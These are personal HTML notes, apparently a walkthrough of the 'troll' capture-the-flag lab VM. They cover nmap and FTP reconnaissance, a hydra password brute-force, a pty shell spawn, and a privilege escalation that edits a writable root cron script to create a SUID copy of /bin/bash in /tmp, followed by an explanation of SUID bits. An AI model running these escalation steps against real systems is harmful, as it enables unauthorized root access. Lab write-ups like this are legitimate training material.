<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>troll</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>troll</h1><br/><p>nmapped into the ip : 192.168.1.38 and found that the ftp port was open and then , found that special file called lol.pcap , there I found the ftp in the protocol hierarchy , finally there as a file called the secret_stuff.txt it said:</p><p>	&quot;you almost found the sup3rs3cr3tdirlol&quot;</p><p>	I tried finding the file in the ftp but got nothing ,  </p><p>	then I figured that the file could be in the website it&#39;s hosting : <a href="http://192.168.1.38/sup3rs3cr3tdirlol/">http://192.168.1.38/sup3rs3cr3tdirlol/</a></p><p>	</p><p>BOOM! got a new file: </p><p>roflmao - ELF executable , find the strings in it via: strings roflmao</p><p>	there is this one string says: Find address 0x0856BF to proceed</p><p>	tip: also try to find all the files names you find everywhere: like I found this on browser:</p><p>	<a href="http://192.168.1.38/0x0856BF">http://192.168.1.38/0x0856BF</a> , there I found 2 sub dirs: good_luck and this_folder_contains_password</p><p></p><p>how I got this? , it&#39;s due to hydra</p><p>Pass.txt password</p><p></p><p></p><p></p><p>for bash shell spawn:</p><p>python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</p><p></p><p>then we find the writable directory so that we can execute our code:</p><p>find / -writable 2&lt;dev/null</p><p></p><p>the filename is cleaner.py</p><p>at location /lib/log/cleaner.py</p><p>when we find the file we add these lines to it in try section:</p><p>os.system(&#39;cp /bin/sh /tmp/sh&#39;)</p><p>os.system(&#39;chmod u+s /tmp/sh&#39;)</p><p></p><p></p><p></p><p>cd /tmp</p><p>ls</p><p>./sh</p><p>cd /root</p><p>ls</p><p>cat proof.txt</p><p>702a8c18d29c6f3ca0d99ef5712bfbdc</p><p></p><p>why this happens:</p><p>set-user-id or set-group-id</p><p></p><p>If the s group of permissions has the user bit set (corresponding to u+s), then whenever anyone executes that program, the process takes on the privileges of whoever owns it. If root owns a file that&#39;s marked u+s and o+x (everyone can execute it), then the file is called &quot;suid root&quot; -- whenever anyone runs it, the program gets full root privileges. This can be a security hole if improper care is given to securing the program itself.</p><p></p><p>The most widely-used reason for doing this is probably the su binary. In order to become another user, the process that&#39;s running needs to have root privileges (according to the manpage in section 2 for setuid, that is). So normal users can&#39;t run a program that changes the current UID -- this means that normally, no one would be able to use su except for root, which is obviously not good.</p><p></p><p>So you make root own the /bin/su program, and make it world executable (or in my case, group executable and then add only users that I wish to be able to become root to the appropriate group), so that when a user starts it up, it begins life with root&#39;s privileges. It can then switch UID&#39;s to anything it wants, subject to the program checking passwords.</p><p></p><p>Use of the g+s bit is similar -- but here, you&#39;re giving whoever can execute the program privileges of a certain group. I don&#39;t think I&#39;ve ever seen this actually used, except for on directories. If that bit is set on a directory, then whichever group owns the directory will also own any files created inside that directory -- but this is a special extension that not all filesystems have to honor. The vast majority do (and I believe that POSIX also prescribes this, but I&#39;m not sure), though.</p><p></p><p></p><p></p><p></p><p></p><p>#!/usr/bin/env python3</p><p>import os</p><p>import sys</p><p>try:</p><p>	os.system(&#39;cp /bin/bash /tmp/bash&#39;)</p><p>	os.system(&#39;chmod u+s /tmp/bash&#39;)</p><p>except:</p><p>	sys.exit()</p><p>	</p><p></p><p></p></div>
</body>
</html>
